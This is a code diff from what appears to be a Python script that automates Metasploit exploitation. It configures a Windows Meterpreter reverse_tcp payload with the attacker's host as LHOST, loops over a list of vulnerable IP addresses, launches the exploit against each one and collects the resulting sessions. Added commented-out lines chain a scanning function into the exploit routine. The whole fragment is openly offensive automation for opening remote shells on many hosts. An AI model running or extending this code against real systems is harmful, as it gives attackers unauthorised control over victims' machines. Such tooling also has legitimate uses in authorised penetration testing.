@@ -84,12 +84,19 @@ def script_automate_exploit(data_read_out, client, console):
     payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
     running_config_payload = main_config_payload('LHOST', hostname, 'STR', payload)
 
-    for ip in ip_vuln:
+    for ip in ip_vuln_reconf:
         # print(ip)
-        main_change_option_exploit('RHOSTS', ip[0], 'STR', exploit)
+        main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
         json, session_create = main_exe_exploit(payload, exploit, client)
 
     print(client.sessions.list)
     sessions_created = client.sessions.list
     return client, sessions_created
 
+
+
+
+# data, client, console = script_automate_scan()
+# print(data, client, console)
+#
+# script_automate_exploit(data, client, console)
